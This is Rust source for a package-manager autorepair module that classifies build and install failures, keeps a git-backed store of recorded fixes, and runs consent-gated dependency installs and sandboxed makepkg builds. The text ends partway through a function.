//! Autorepair engine — classifies install/build failures from tool output,
//! plans deterministic repairs, and retries with a bounded budget.
//!
//! Contract (user-validated):
//!   * PARSERS recognize errors, warnings, missing/unmatched dependencies
//!     across pacman/makepkg/compilers/curl/bsdtar/ar and yapacc's own lanes.
//!   * STRATEGIES are per failure class. Safe ones (install a missing repo
//!     dep, install a known build tool, retry a flaky download) run
//!     automatically; dangerous ones (checksum refresh) are ALWAYS gated —
//!     yapacc never silently rewrites a checksum to make tampering invisible.
//!   * Repairs are recorded as fix records (JSON + recipe copy) in the local
//!     fix store, and can be pushed to a user-configured git remote
//!     ("broken package fixer repo"). Applying a fetched fix passes the same
//!     review gate as any recipe.

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

// ---------------------------------------------------------------------------
// Failure taxonomy
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum FailureClass {
    /// a build/runtime dependency name is missing (makepkg "missing package:", pacman "target not found")
    MissingDependency(String),
    /// a build tool is absent (gcc/make/cmake... "command not found")
    MissingBuildTool(String),
    /// "did not pass the validity check" / yapacc "checksum mismatch"
    ChecksumMismatch(Vec<String>),
    /// upstream source URL is gone (curl 404/403)
    SourceGone(String),
    /// missing PGP signing key
    MissingPgpKey(String),
    /// archive corrupt / truncated / unsupported compression (deb/rpm/snap/pkg lanes)
    ArchiveCorrupt(String),
    /// running makepkg as root without a build user
    MakepkgAsRoot,
    /// macOS-only software: linker/compiler reaching for Apple frameworks
    MacOsOnly,
    /// everything else: real build error needing human eyes
    BuildError(String),
}

#[derive(Clone, Debug, Serialize)]
pub struct Diagnosis {
    pub class: FailureClass,
    pub evidence: String,
    /// suggested repair, human-readable
    pub repair: String,
    /// can yapacc attempt this automatically?
    pub auto: bool,
}

/// Known build tools mapped to repo package names (Arch).
const BUILD_TOOLS: &[(&str, &str)] = &[
    ("gcc", "gcc"),
    ("g++", "gcc"),
    ("cc", "gcc"),
    ("clang", "clang"),
    ("make", "make"),
    ("cmake", "cmake"),
    ("ninja", "ninja"),
    ("meson", "meson"),
    ("autoconf", "autoconf"),
    ("automake", "automake"),
    ("libtoolize", "libtool"),
    ("pkg-config", "pkgconf"),
    ("pkgconf", "pkgconf"),
    ("patch", "patch"),
    ("bison", "bison"),
    ("flex", "flex"),
    ("git", "git"),
    ("cargo", "rust"),
    ("go", "go"),
    ("python", "python"),
    ("pip", "python-pip"),
    ("npm", "nodejs"),
    ("yarn", "yarn"),
    ("cargo-build", "rust"),
];

/// Parse tool output into classified diagnoses (pure; unit-tested against
/// real-world log excerpts).
pub fn parse_failures(output: &str) -> Vec<Diagnosis> {
    let mut out: Vec<Diagnosis> = Vec::new();
    let mut push = |d: Diagnosis| {
        // singleton classes collapse on discriminant; named classes
        // (deps/tools/keys) collapse on the exact name so multiple distinct
        // missing dependencies are all reported.
        let dup = out.iter().any(|x| match (&x.class, &d.class) {
            (FailureClass::MissingDependency(a), FailureClass::MissingDependency(b)) => a == b,
            (FailureClass::MissingBuildTool(a), FailureClass::MissingBuildTool(b)) => a == b,
            (FailureClass::MissingPgpKey(a), FailureClass::MissingPgpKey(b)) => a == b,
            (a, b) => std::mem::discriminant(a) == std::mem::discriminant(b),
        });
        if !dup {
            out.push(d);
        }
    };
    // makepkg 7 lists missing dependencies as
    // "==> Missing dependencies:" followed by "  -> name" lines
    let mut in_missing_list = false;
    for line in output.lines() {
        let l = line.trim();
        if l.ends_with("Missing dependencies:") {
            in_missing_list = true;
            continue;
        }
        if in_missing_list {
            if let Some(name) = l.strip_prefix("-> ") {
                push(Diagnosis {
                    class: FailureClass::MissingDependency(name.trim().to_string()),
                    evidence: l.to_string(),
                    repair: "install the missing make/build dependency, then retry".into(),
                    auto: true,
                });
                continue;
            }
            in_missing_list = false;
        }
        // ---- pacman ----
        if let Some(name) = l.strip_prefix("error: target not found: ") {
            push(Diagnosis {
                class: FailureClass::MissingDependency(name.trim().to_string()),
                evidence: l.to_string(),
                repair: "install the missing target, then retry".into(),
                auto: true,
            });
        }
        if l.contains("could not satisfy dependencies") || l.contains("breaks dependency") {
            push(Diagnosis {
                class: FailureClass::BuildError("dependency conflict".into()),
                evidence: l.to_string(),
                repair: "review the conflict (remove/replace one side) — not auto-repairable"
                    .into(),
                auto: false,
            });
        }
        // ---- makepkg ----
        // "    missing package: foo" (follows "Could not find all required packages")
        if let Some(name) = l.strip_prefix("missing package: ") {
            push(Diagnosis {
                class: FailureClass::MissingDependency(name.trim().to_string()),
                evidence: l.to_string(),
                repair: "install the missing make/build dependency, then retry".into(),
                auto: true,
            });
        }
        if l.contains("failed to prepare transaction") {
            push(Diagnosis {
                class: FailureClass::BuildError("pacman transaction failed".into()),
                evidence: l.to_string(),
                repair: "see surrounding lines for the concrete cause".into(),
                auto: false,
            });
        }
        if l.contains("did not pass the validity check")
            || l.contains("Integrity check failed")
            || l.contains("checksum mismatch")
        {
            push(Diagnosis {
                class: FailureClass::ChecksumMismatch(vec![]),
                evidence: l.to_string(),
                repair: "re-download once (mirror flake); if it persists, upstream changed the artifact — refresh checksums ONLY after review (--allow-checksum-refresh)".into(),
                auto: false, // re-download happens naturally on retry; refresh is gated
            });
        }
        if l.contains("Integrity checks are missing") {
            push(Diagnosis {
                class: FailureClass::ChecksumMismatch(vec!["missing".into()]),
                evidence: l.to_string(),
                repair: "generate checksums (makepkg -g >> PKGBUILD) after reviewing sources"
                    .into(),
                auto: false,
            });
        }
        if let Some(u) = l.strip_prefix("curl: (22) The requested URL returned error: ") {
            push(Diagnosis {
                class: FailureClass::SourceGone(u.trim().to_string()),
                evidence: l.to_string(),
                repair: "source URL gone — locate the new upstream release and update the recipe"
                    .into(),
                auto: false,
            });
        }
        if l.contains("Failure while downloading") {
            push(Diagnosis {
                class: FailureClass::SourceGone(String::new()),
                evidence: l.to_string(),
                repair: "download failed — check URL/mirrors; retry may help for flakes".into(),
                auto: false,
            });
        }
        if l.contains("PGP signatures could not be verified") || l.contains("unknown public key") {
            let key = l.rsplit(' ').next().unwrap_or("").to_string();
            push(Diagnosis {
                class: FailureClass::MissingPgpKey(key),
                evidence: l.to_string(),
                repair:
                    "import the signing key: gpg --recv-keys <key> (verify the fingerprint first!)"
                        .into(),
                auto: false,
            });
        }
        if l.contains("Running makepkg as root is not allowed") {
            push(Diagnosis {
                class: FailureClass::MakepkgAsRoot,
                evidence: l.to_string(),
                repair: "pass --build-user <user> (makepkg refuses root)".into(),
                auto: false,
            });
        }
        // ---- build tools / compilers ----
        if let Some(tool) = parse_command_not_found(l)
            && let Some((_, pkg)) = BUILD_TOOLS.iter().find(|(t, _)| *t == tool)
        {
            push(Diagnosis {
                class: FailureClass::MissingBuildTool(tool.to_string()),
                evidence: l.to_string(),
                repair: format!("install '{pkg}' from the repos and retry"),
                auto: true,
            });
        }
        if l.contains(": error while loading shared libraries:")
            && l.contains("cannot open shared object file")
        {
            let lib = l
                .split("error while loading shared libraries:")
                .nth(1)
                .and_then(|r| r.split(':').next())
                .unwrap_or("")
                .trim()
                .to_string();
            push(Diagnosis {
                class: FailureClass::MissingDependency(lib),
                evidence: l.to_string(),
                repair: "runtime soname missing — resolve via the dependency store/tap (or host if policy allows)".into(),
                auto: false,
            });
        }
        if l.contains("fatal error:") && l.contains(": No such file or directory") {
            let header = l
                .split("fatal error:")
                .nth(1)
                .unwrap_or("")
                .split(':')
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            let h = header.clone();
            push(Diagnosis {
                class: FailureClass::MissingDependency(h),
                evidence: l.to_string(),
                repair: format!(
                    "missing header '{header}' — find the -devel/-dev package providing it (repo search) and retry"
                ),
                auto: false,
            });
        }
        // ---- archive/extract lane ----
        if l.contains("Unrecognized archive format")
            || l.contains("Error opening archive")
            || l.contains("ar: no archive members")
            || l.contains("missing data.tar member")
            || l.contains("missing control.tar member")
        {
            push(Diagnosis {
                class: FailureClass::ArchiveCorrupt(l.to_string()),
                evidence: l.to_string(),
                repair: "artifact corrupt or wrong format — re-download once; if it persists the file is not a valid package of that format".into(),
                auto: false,
            });
        }
        if l.contains("failed to decompress") {
            push(Diagnosis {
                class: FailureClass::ArchiveCorrupt(l.to_string()),
                evidence: l.to_string(),
                repair: "unsupported/failed compression — install xz/zstd support or re-download"
                    .into(),
                auto: false,
            });
        }
        // ---- generic build error ----
        if l.starts_with("make: *** [") && l.contains("Error") {
            push(Diagnosis {
                class: FailureClass::BuildError("make target failed".into()),
                evidence: l.to_string(),
                repair: "open the build log above; edit the recipe (fixer loop) and rebuild".into(),
                auto: false,
            });
        }
        // ---- mac-only signal (brew cascade / recipe lane) ----
        if l.contains("framework not found")
            || l.contains("CoreFoundation")
            || l.contains("AppKit")
            || l.contains("-framework Cocoa")
            || l.contains("xcrun: error")
            || l.contains("SDK \"macos")
        {
            push(Diagnosis {
                class: FailureClass::MacOsOnly,
                evidence: l.to_string(),
                repair: "the build reaches for macOS frameworks — this software is probably macOS-only; consider the Darling runtime (gated) or a container alternative".into(),
                auto: false,
            });
        }
        if l.starts_with("CMake Error") {
            push(Diagnosis {
                class: FailureClass::BuildError("cmake configure failed".into()),
                evidence: l.to_string(),
                repair: "inspect the CMake error above (often a missing dependency or old API)"
                    .into(),
                auto: false,
            });
        }
    }
    out
}

/// "foo: command not found" / "make: foo: No such file or directory" → "foo"
fn parse_command_not_found(line: &str) -> Option<String> {
    if let Some(rest) = line.strip_suffix(": command not found") {
        let tool = rest.rsplit(' ').next().unwrap_or("");
        if !tool.is_empty() {
            return Some(tool.to_string());
        }
    }
    if let Some((_, rest)) = line.split_once("make: ")
        && line.contains(": No such file or directory")
    {
        let tool = rest.split(':').next()?.trim().to_string();
        if !tool.is_empty() && !tool.contains(' ') {
            return Some(tool);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Fix store (broken-package fixer repo, git-backed, opt-in remote)
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct FixRecord {
    pub pkg: String,
    pub lane: String,
    pub timestamp: u64,
    pub failure_classes: Vec<String>,
    pub strategies_applied: Vec<String>,
    pub recipe: String,
    pub notes: String,
    pub yapacc_version: String,
}

pub fn fixes_root() -> PathBuf {
    let xdg = crate::config::xdg_base("XDG_DATA_HOME", ".local/share")
        .unwrap_or_else(|| PathBuf::from(".local/share"));
    xdg.join("yapacc/fixes")
}

/// Record a successful repair so it can be shared/pulled later.
pub fn record_fix(rec: &FixRecord) -> Result<PathBuf, String> {
    let dir = fixes_root().join(rec.pkg.replace('/', "_"));
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join("fix.json");
    let data = serde_json::to_string_pretty(rec).map_err(|e| e.to_string())?;
    fs::write(&path, data + "\n").map_err(|e| e.to_string())?;
    fs::write(dir.join("PKGBUILD"), &rec.recipe).map_err(|e| e.to_string())?;
    Ok(path)
}

pub fn list_fixes() -> Result<Vec<(String, PathBuf)>, String> {
    let root = fixes_root();
    if !root.is_dir() {
        return Ok(vec![]);
    }
    let mut out = Vec::new();
    for e in fs::read_dir(&root).map_err(|e| e.to_string())?.flatten() {
        if e.path().join("fix.json").is_file() {
            out.push((e.file_name().to_string_lossy().to_string(), e.path()));
        }
    }
    out.sort();
    Ok(out)
}

/// Push the local fix store to the configured git remote (user-configured;
/// yapacc never ships a default server). gated by the caller.
pub fn fixes_push() -> Result<String, String> {
    let remote = crate::config::get().fixes.remote.clone().ok_or(
        "no fix remote configured — set [fixes] remote in the config (a git URL you control)",
    )?;
    push_store(&fixes_root(), &remote, &[])
}

/// Pull shared fixes from the configured remote into the local store.
pub fn fixes_pull() -> Result<String, String> {
    let remote = crate::config::get()
        .fixes
        .remote
        .clone()
        .ok_or("no fix remote configured — set [fixes] remote in the config")?;
    pull_store(&fixes_root(), &remote, &[])
}

/// One git command in the fix store. `args` is an argument vector; the
/// remote and branch names in it are data, never part of a shell string.
fn store_git(root: &Path, env: &[(&str, &str)], args: &[&str]) -> Result<String, String> {
    let out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .envs(env.iter().copied())
        .output()
        .map_err(|e| format!("git could not be started: {e}"))?;
    let stdout = String::from_utf8_lossy(&out.stdout).to_string();
    if out.status.success() {
        return Ok(stdout);
    }
    let stderr = String::from_utf8_lossy(&out.stderr);
    let said = if stderr.trim().is_empty() {
        stdout.trim()
    } else {
        stderr.trim()
    };
    let verb = args
        .iter()
        .find(|a| !a.starts_with('-') && !a.contains('='))
        .unwrap_or(&"");
    Err(format!("git {verb} failed: {said}"))
}

/// A remote or branch name that git cannot read as an option.
fn valid_git_operand(v: &str) -> bool {
    !v.is_empty() && !v.starts_with('-') && !v.chars().any(|c| c.is_control())
}

/// `-c` options that give git an author when the user has configured none
/// (a fresh account, a container): without them `git commit` and a merging
/// `git pull` stop with "Please tell me who you are".
fn identity_args(root: &Path, env: &[(&str, &str)]) -> Vec<&'static str> {
    if store_git(root, env, &["config", "user.email"]).is_ok() {
        Vec::new()
    } else {
        vec![
            "-c",
            "user.name=yapacc",
            "-c",
            "user.email=yapacc@localhost",
        ]
    }
}

/// Make the store a git repository whose `origin` is `remote`.
fn open_store(root: &Path, remote: &str, env: &[(&str, &str)]) -> Result<(), String> {
    if !valid_git_operand(remote) {
        return Err(format!(
            "the fix remote '{remote}' is not a usable git URL; nothing was done"
        ));
    }
    fs::create_dir_all(root).map_err(|e| format!("cannot create {}: {e}", root.display()))?;
    if !root.join(".git").exists() {
        store_git(root, env, &["init", "-q"])?;
    }
    match store_git(root, env, &["remote", "get-url", "origin"]) {
        Ok(url) if url.trim() == remote => {}
        Ok(_) => {
            store_git(root, env, &["remote", "set-url", "origin", remote])?;
        }
        Err(_) => {
            store_git(root, env, &["remote", "add", "origin", remote])?;
        }
    }
    Ok(())
}

fn store_has_commits(root: &Path, env: &[(&str, &str)]) -> bool {
    store_git(root, env, &["rev-parse", "--verify", "-q", "HEAD"]).is_ok()
}

/// Which branch of the remote holds the fixes: the store's own branch when
/// the remote has it, else the remote's default branch, else its only
/// branch. `None` when the remote has no commits yet.
fn remote_branch(root: &Path, env: &[(&str, &str)]) -> Result<Option<String>, String> {
    let listing = store_git(root, env, &["ls-remote", "--symref", "origin"])?;
    let mut default = None;
    let mut heads: Vec<String> = Vec::new();
    for line in listing.lines() {
        if let Some(rest) = line.strip_prefix("ref: refs/heads/") {
            if let Some(name) = rest.strip_suffix("\tHEAD") {
                default = Some(name.to_string());
            }
        } else if let Some((_, name)) = line.split_once("\trefs/heads/") {
            heads.push(name.to_string());
        }
    }
    let own = store_git(root, env, &["symbolic-ref", "--short", "-q", "HEAD"])
        .ok()
        .map(|b| b.trim().to_string())
        .filter(|b| store_has_commits(root, env) && heads.contains(b));
    let branch = match (own, default) {
        (Some(b), _) => b,
        (None, Some(b)) if heads.contains(&b) => b,
        _ if heads.is_empty() => return Ok(None),
        _ if heads.len() == 1 => heads.remove(0),
        _ => {
            return Err(format!(
                "the fix remote has several branches ({}) and no default one; nothing was pulled",
                heads.join(", ")
            ));
        }
    };
    if !valid_git_operand(&branch) {
        return Err(format!(
            "the fix remote's branch '{branch}' is not a usable name; nothing was pulled"
        ));
    }
    Ok(Some(branch))
}

/// `fixes push` for the store at `root`. Ordinary states that are not
/// errors: a store that is not a repository yet, nothing new to commit, no
/// git identity configured, a changed `[fixes] remote`.
fn push_store(root: &Path, remote: &str, env: &[(&str, &str)]) -> Result<String, String> {
    open_store(root, remote, env)?;
    store_git(root, env, &["add", "-A"])?;
    let dirty = !store_git(root, env, &["status", "--porcelain"])?
        .trim()
        .is_empty();
    if dirty {
        let mut args = identity_args(root, env);
        args.extend(["commit", "-q", "-m", "yapacc fixes update"]);
        store_git(root, env, &args)?;
    }
    if !store_has_commits(root, env) {
        return Ok(format!(
            "no fix has been recorded yet: nothing was pushed to {remote}"
        ));
    }
    store_git(root, env, &["push", "-q", "-u", "origin", "HEAD"]).map_err(|e| {
        format!(
            "{e}\nNothing was pushed. If the remote holds fixes this store lacks, run `yapacc fixes pull` first."
        )
    })?;
    Ok(if dirty {
        format!("fixes pushed to {remote}")
    } else {
        format!("nothing new to commit; the store is pushed to {remote}")
    })
}

/// `fixes pull` for the store at `root`. Ordinary states that are not
/// errors: fixes recorded locally before the first pull (the store is a
/// non-empty directory that is not a repository yet), a repository with no
/// upstream branch configured, local commits the remote lacks (merged), an
/// empty remote.
fn pull_store(root: &Path, remote: &str, env: &[(&str, &str)]) -> Result<String, String> {
    open_store(root, remote, env)?;
    let Some(branch) = remote_branch(root, env)? else {
        return Ok(format!(
            "the remote {remote} has no commits yet: nothing was pulled"
        ));
    };
    if !store_has_commits(root, env) {
        // name the unborn branch after the remote's, so a later push
        // updates that branch instead of creating a second one
        let head = format!("refs/heads/{branch}");
        store_git(root, env, &["symbolic-ref", "HEAD", &head])?;
    }
    let mut args: Vec<&str> = identity_args(root, env);
    args.extend(["pull", "-q", "--no-rebase", "--no-edit", "origin", &branch]);
    store_git(root, env, &args).map_err(|e| {
        format!(
            "{e}\nThe fixes of {remote} were not merged into {}.",
            root.display()
        )
    })?;
    let upstream = format!("--set-upstream-to=origin/{branch}");
    let _ = store_git(root, env, &["branch", "-q", &upstream]);
    Ok(format!(
        "fixes pulled from {remote} (apply via the recipe review gate)"
    ))
}

/// Find a stored fix for a package (local store; used by tests and the
/// upcoming `fixes apply` flow).
#[allow(dead_code)]
pub fn find_fix(pkg: &str) -> Option<(FixRecord, PathBuf)> {
    let dir = fixes_root().join(pkg.replace('/', "_")).join("fix.json");
    let data = fs::read_to_string(&dir).ok()?;
    let rec: FixRecord = serde_json::from_str(&data).ok()?;
    Some((rec, dir))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn classes(out: &str) -> Vec<FailureClass> {
        parse_failures(out).into_iter().map(|d| d.class).collect()
    }

    #[test]
    fn parses_makepkg_missing_dep() {
        let log = "==> Making package: foo 1.0-1\n==> ERROR: Could not find all required packages:\n    missing package: bar\n    missing package: baz>=2";
        let c = classes(log);
        assert!(c.contains(&FailureClass::MissingDependency("bar".into())));
        assert!(c.contains(&FailureClass::MissingDependency("baz>=2".into())));
    }

    #[test]
    fn parses_makepkg7_missing_dependencies_list() {
        // observed on Arch (makepkg 7): the old "missing package:" form is gone
        let log = "==> Making package: figlet-fonts 1.1-1 (Wed Nov 18 13:16:48 2026)\n==> Checking runtime dependencies...\n==> Missing dependencies:\n  -> figlet\n  -> baz>=2\n==> ERROR: Could not resolve all dependencies.";
        let c = classes(log);
        assert!(c.contains(&FailureClass::MissingDependency("figlet".into())));
        assert!(c.contains(&FailureClass::MissingDependency("baz>=2".into())));
        assert_eq!(c.len(), 2, "{c:?}");
    }

    #[test]
    fn parses_pacman_target_not_found() {
        let log = "resolving dependencies...\nerror: target not found: coolpkg";
        assert!(classes(log).contains(&FailureClass::MissingDependency("coolpkg".into())));
    }

    #[test]
    fn parses_checksum_mismatch_and_gates_it() {
        let log = "foo-1.0.tar.gz ... FAILED\n==> ERROR: One or more files did not pass the validity check!";
        let ds = parse_failures(log);
        assert!(
            ds.iter()
                .any(|d| matches!(d.class, FailureClass::ChecksumMismatch(_)))
        );
        assert!(
            ds.iter()
                .all(|d| matches!(d.class, FailureClass::ChecksumMismatch(_)) || !d.auto),
            "checksum repair must never be auto"
        );
    }

    #[test]
    fn parses_missing_build_tools() {
        assert!(
            classes("gcc: command not found")
                .contains(&FailureClass::MissingBuildTool("gcc".into()))
        );
        assert!(
            classes("make: gcc: No such file or directory")
                .contains(&FailureClass::MissingBuildTool("gcc".into()))
        );
        assert!(
            classes("/bin/sh: cmake: command not found")
                .contains(&FailureClass::MissingBuildTool("cmake".into()))
        );
        // unknown tools are not classified as tools
        assert!(
            !classes("mycustomthing: command not found")
                .iter()
                .any(|c| matches!(c, FailureClass::MissingBuildTool(_)))
        );
    }

    #[test]
    fn parses_source_gone_and_pgp() {
        assert!(
            classes("curl: (22) The requested URL returned error: 404")
                .contains(&FailureClass::SourceGone("404".into()))
        );
        let cs = classes("gpg: unknown public key ABC123");
        assert!(matches!(&cs[0], FailureClass::MissingPgpKey(k) if k.contains("ABC123")));
    }

    #[test]
    fn parses_archive_corrupt() {
        assert!(matches!(
            classes("bsdtar: Unrecognized archive format")[0],
            FailureClass::ArchiveCorrupt(_)
        ));
        assert!(matches!(
            classes("ar: no archive members")[0],
            FailureClass::ArchiveCorrupt(_)
        ));
    }

    #[test]
    fn parses_missing_soname_and_header() {
        let c = classes(
            "./app: error while loading shared libraries: libssl.so.3: cannot open shared object file",
        );
        assert!(c.contains(&FailureClass::MissingDependency("libssl.so.3".into())));
        let c2 = classes("src/main.c:2:10: fatal error: gtk/gtk.h: No such file or directory");
        assert!(c2.contains(&FailureClass::MissingDependency("gtk/gtk.h".into())));
    }

    #[test]
    fn deduplicates_classes() {
        let log = "make: gcc: No such file or directory\nmake: gcc: No such file or directory";
        assert_eq!(parse_failures(log).len(), 1);
    }

    #[test]
    fn fix_record_roundtrip() {
        let rec = FixRecord {
            pkg: "test-pkg".into(),
            lane: "recipe".into(),
            timestamp: 1,
            failure_classes: vec!["missing_build_tool".into()],
            strategies_applied: vec!["install_repo_deps(gcc)".into()],
            recipe: "pkgname=test-pkg".into(),
            notes: "test".into(),
            yapacc_version: "test".into(),
        };
        let path = record_fix(&rec).unwrap();
        assert!(path.exists());
        let (loaded, _) = find_fix("test-pkg").unwrap();
        assert_eq!(loaded.pkg, "test-pkg");
        assert_eq!(loaded.recipe, "pkgname=test-pkg");
        let _ = fs::remove_dir_all(fixes_root().join("test-pkg"));
    }
}

// ---------------------------------------------------------------------------
// Repair runner: bounded retry loop with strategy application
// ---------------------------------------------------------------------------

#[derive(Clone, Debug)]
pub struct RepairPolicy {
    pub enabled: bool,
    /// total build attempts (1 initial + retries); default 3
    pub max_attempts: u32,
    /// checksum refresh is dangerous (defeats tamper detection): only with
    /// the explicit flag, and the old/new hashes are always printed.
    pub allow_checksum_refresh: bool,
    /// interactive: open $EDITOR on the recipe for BuildError diagnoses
    pub interactive: bool,
    pub record_fix: bool,
    pub lane: String,
    pub pkg: String,
    /// confinement of the build itself
    pub sandbox: crate::sandbox::Policy,
    /// allow network during build()/package() (default: fetch phase only)
    pub build_net: bool,
    /// may autorepair install missing build dependencies from the official repos?
    pub dep_consent: DepConsent,
}

/// Consent for the one autorepair strategy that changes the system:
/// installing packages whose names were inferred from build output.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DepConsent {
    /// ask on the terminal, listing the exact packages
    Ask,
    /// the user passed --repair-deps
    Granted,
    /// non-interactive without --repair-deps: report, never install
    Deny,
}

impl Default for RepairPolicy {
    fn default() -> Self {
        Self {
            enabled: true,
            max_attempts: 3,
            allow_checksum_refresh: false,
            interactive: false,
            record_fix: true,
            lane: "recipe".into(),
            pkg: String::new(),
            sandbox: crate::sandbox::Policy::from_config(),
            build_net: false,
            dep_consent: DepConsent::Deny,
        }
    }
}

#[derive(Clone, Debug, Serialize)]
pub struct AttemptLog {
    pub n: u32,
    pub diagnoses: Vec<String>,
    pub strategies_applied: Vec<String>,
    pub output_tail: String,
}

fn run_captured(mut p: crate::sandbox::Prepared, what: &str) -> Result<(bool, String), String> {
    let out = p
        .command
        .output()
        .map_err(|e| format!("{what} failed to start: {e}"))?;
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    print!("{stdout}");
    if !stderr.trim().is_empty() {
        eprint!("{stderr}");
    }
    Ok((out.status.success(), format!("{stdout}\n{stderr}")))
}

/// Who runs the build: nobody special for an ordinary user, the named build
/// user for root (makepkg refuses root).
fn build_identity(build_user: Option<&str>) -> Result<Option<&str>, String> {
    if !crate::util::is_root() {
        return Ok(None);
    }
    build_user
        .map(Some)
        .ok_or_else(|| "running as root: provide --build-user (makepkg refuses root)".to_string())
}

/// One makepkg attempt in `dir`, never as root (root must name a
/// `build_user`, which the build then runs as).
///
/// Confined builds run in two phases so that the network is only reachable
/// while sources are being fetched:
///
/// 1. `makepkg --nobuild` — download, verify, extract, `prepare()`:
///    network shared, everything else confined;
/// 2. `makepkg --noextract` — `build()` and `package()`: no network unless
///    `policy.build_net`.
///
/// With the sandbox switched off this is a plain single `makepkg -f`.
pub fn makepkg_attempt(
    dir: &Path,
    build_user: Option<&str>,
    policy: &RepairPolicy,
) -> Result<(), String> {
    use crate::sandbox::{self, Net};
    let run_as = build_identity(build_user)?;
    if let Some(bu) = run_as {
        // -h: a link in the tree is re-owned itself, never what it points
        // to. The sandbox home is not in this tree; `sandbox::Home` hands
        // it to the build user on its own.
        let _ = Command::new("chown")
            .args(["-R", "-h", "--", bu])
            .arg(dir)
            .status();
    }
    let fetch = sandbox::command(
        dir,
        Net::Shared,
        policy.sandbox,
        run_as,
        &["makepkg", "--nobuild", "-f", "--noconfirm"],
    )?;
    if !fetch.sandboxed {
        // unconfined: one ordinary makepkg run
        let plain = sandbox::command(
            dir,
            Net::Shared,
            sandbox::Policy::Off,
            run_as,
            &["makepkg", "-f", "--noconfirm"],
        )?;
        eprintln!("(build NOT sandboxed)");
        let (ok, out) = run_captured(plain, "makepkg")?;
        return if ok { Ok(()) } else { Err(out) };
    }
    let build_net = if policy.build_net {
        Net::Shared
    } else {
        Net::Isolated
    };
    eprintln!(
        "(build sandboxed: host read-only, personal directories and /run hidden, network {})",
        if policy.build_net {
            "shared for the whole build (--build-net)"
        } else {
            "only while fetching sources"
        }
    );
    // one throwaway $HOME for both phases: what prepare() downloads there
    // (cargo, go, npm caches) is what build() then uses without network
    let home = fetch.home.clone();
    let (ok, fetched) = run_captured(fetch, "makepkg (fetch phase)")?;
    if !ok {
        return Err(fetched);
    }
    let build = sandbox::command_with_home(
        dir,
        build_net,
        policy.sandbox,
        run_as,
        home,
        &["makepkg", "--noextract", "-f", "--noconfirm"],
    )?;
    let (ok, built) = run_captured(build, "makepkg (build phase)")?;
    if ok {
        return Ok(());
    }
    let mut out = format!("{fetched}\n{built}");
    if !policy.build_net && looks_like_network_failure(&built) {
        out.push_str(
            "\nyapacc: the build phase runs without network and this build tried to download something.\n        A well-formed recipe fetches in prepare(); if you trust this one, re-run with --build-net.\n",
        );
        eprintln!(
            "hint: build() tried to reach the network, which the sandbox blocks by default; re-run with --build-net if you trust this recipe."
        );
    }
    Err(out)
}

fn looks_like_network_failure(out: &str) -> bool {
    let l = out.to_lowercase();
    [
        "could not resolve host",
        "temporary failure in name resolution",
        "network is unreachable",
        "failed to lookup address",
        "dial tcp",
        "couldn't connect to server",
        "failed to connect",
    ]
    .iter()
    .any(|needle| l.contains(needle))
}

/// Names from build output that are safe to hand to pacman AND exist in an
/// official sync repository. Anything else is dropped with a note.
fn official_repo_candidates(names: &[String]) -> Vec<String> {
    let mut out = Vec::new();
    for n in names {
        if !crate::util::valid_pkg_name(n) {
            eprintln!("autorepair: ignoring '{n}' (not a valid package name)");
            continue;
        }
        let known = Command::new("pacman")
            .args(["-Si", "--"])
            .arg(n)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if known {
            out.push(n.clone());
        } else {
            eprintln!("autorepair: '{n}' is not in the official repos; left for manual handling");
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Install build dependencies inferred from a failed build — the only
/// autorepair strategy that changes the system, so it is consent-gated:
/// the exact package list is shown and nothing is installed unless the
/// user agrees (interactively, or up front with `--repair-deps`).
fn install_inferred_deps(
    names: &[String],
    policy: &RepairPolicy,
) -> Result<Option<String>, String> {
    let pkgs = official_repo_candidates(names);
    if pkgs.is_empty() {
        return Ok(None);
    }
    let list = pkgs.join(" ");
    let granted = match policy.dep_consent {
        DepConsent::Granted => true,
        DepConsent::Ask => {
            println!(
                "\nautorepair: the build is missing packages available in the official repos:\n  {list}\n(names were inferred from the build output of a recipe you reviewed, not from a plan you approved)"
            );
            crate::prompt::confirm_or_proceed("Install them now", false, false, false)
                .unwrap_or(false)
        }
        DepConsent::Deny => false,
    };
    if !granted {
        println!(
            "autorepair: NOT installing inferred dependencies without consent.\n  install them yourself:  yapacc install repo {list}\n  or allow it up front:    --repair-deps"
        );
        return Ok(None);
    }
    let exe = crate::util::core_exe();
    let out = Command::new(&exe)
        .args(["install", "repo", "--yes", "--"])
        .args(&pkgs)
        .output()
        .map_err(|e| format!("failed to run {}: {e}", exe.display()))?;
    if !out.status.success() {
        return Err(format!(
            "installing inferred dependencies ({list}) failed: {}{}",
            String::from_utf8_lossy(&out.stdout).trim(),
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(Some(format!("install repo deps (consented): {list}")))
}

/// Apply the auto-safe strategies for the current diagnoses.
/// Returns the list of strategy descriptions applied (possibly empty).
fn apply_auto_strategies(
    diagnoses: &[Diagnosis],
    dir: &Path,
    build_user: Option<&str>,
    policy: &RepairPolicy,
) -> Result<Vec<String>, String> {
    let mut applied = Vec::new();
    // 1+2. missing build tools and missing dependencies -> one consented
    //      install from the official repos
    let mut wanted: Vec<String> = diagnoses
        .iter()
        .filter_map(|d| match &d.class {
            FailureClass::MissingBuildTool(t) => BUILD_TOOLS
                .iter()
                .find(|(k, _)| k == t)
                .map(|(_, pkg)| pkg.to_string()),
            FailureClass::MissingDependency(n) => {
                let base = n.split(['<', '>', '=']).next().unwrap_or(n).trim();
                // sonames ("libssl.so.3") and headers ("gtk/gtk.h") are
                // diagnoses, not package names
                (!base.contains('/') && !base.contains(".so") && !base.ends_with(".h"))
                    .then(|| base.to_string())
            }
            _ => None,
        })
        .collect();
    wanted.sort();
    wanted.dedup();
    if !wanted.is_empty() {
        match install_inferred_deps(&wanted, policy) {
            Ok(Some(done)) => applied.push(done),
            Ok(None) => {}
